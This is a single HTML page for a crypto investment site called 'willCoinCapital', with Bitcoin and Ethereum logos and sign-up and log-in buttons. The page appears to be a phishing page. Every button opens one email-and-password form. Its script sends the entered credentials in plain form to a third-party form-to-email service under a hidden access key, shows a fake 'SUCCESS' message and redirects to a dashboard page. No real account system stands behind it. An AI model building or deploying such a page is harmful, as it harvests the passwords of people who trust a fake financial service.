<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000000; color: white; margin: 0; overflow: hidden; height: 100vh; }
        .main-aura {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 450px; height: 450px;
            background: radial-gradient(circle, rgba(20, 184, 166, 0.2) 0%, rgba(34, 211, 238, 0) 70%);
            filter: blur(60px); z-index: 1; pointer-events: none;
        }
        .brand-logo { font-size: 26px; font-weight: 800; text-transform: uppercase; }
        .brand-capital { color: #22d3ee; }
        .asset-card {
            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px;
            width: 135px; height: 135px; display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .btn-recover { border: 1px solid rgba(20, 184, 166, 0.5); color: #14b8a6; }
        .btn-create { background: linear-gradient(to right, #14b8a6, #22d3ee); color: #000; }
        .view-hidden { display: none !important; }
    </style>
</head>
<body class="flex flex-col items-center justify-between py-16 px-10 relative">

    <div class="main-aura"></div>

    <header class="text-center z-20 space-y-3">
        <div class="brand-logo"><span>WILLCOIN</span><span class="brand-capital">CAPITAL</span></div>
        <h1 class="text-[34px] font-extrabold tracking-tighter leading-tight pt-4">
            Own Your Assets <br> <span class="text-cyan-400">Invest Your Assets</span>
        </h1>
    </header>

    <div class="flex gap-6 z-10">
        <div class="asset-card"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.svg" class="w-10 h-10"></div>
        <div class="asset-card"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" class="w-10 h-10"></div>
    </div>

    <div class="w-full max-w-sm space-y-4 z-20">
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-recover text-[11px] font-black uppercase">Recover Account</button>
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-create text-[11px] font-black uppercase">Create Account</button>
        <div class="text-center pt-4">
            <button onclick="toggleAuth('login')" class="text-[10px] text-gray-500 font-bold uppercase">Already Have An Account? <span class="text-white ml-1">Log In</span></button>
        </div>
    </div>

    <div id="authModal" class="fixed inset-0 z-[100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="toggleAuth()"></div>
        <div class="relative z-10 w-full max-w-xs space-y-6">
            <h2 id="authTitle" class="text-center text-xl font-black uppercase text-cyan-400">SIGN UP</h2>
            <form id="authForm" class="space-y-3">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="EMAIL ADDRESS" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] text-white outline-none uppercase">
                <input type="password" name="password" placeholder="PASSWORD" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] text-white outline-none uppercase">
                <button type="submit" id="authSubmit" class="w-full py-4 btn-create rounded-xl text-[10px] font-black">CONTINUE</button>
            </form>
        </div>
    </div>

    <script>
        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            
            // This fixes the "System Entry" issue
            document.getElementById('authTitle').innerText = (mode === 'login') ? 'WELCOME BACK' : 'SIGN UP';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            btn.innerText = "SYNCHRONIZING...";
            
            try {
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                btn.innerText = "SUCCESS";
                
                // This forces the redirect to the file you have in GitHub
                setTimeout(() => {
                    window.location.href = "./dashboard.html";
                }, 1500);
            } catch(err) {
                btn.innerText = "ERROR - RETRY";
            }
        };
    </script>
</body>
</html>
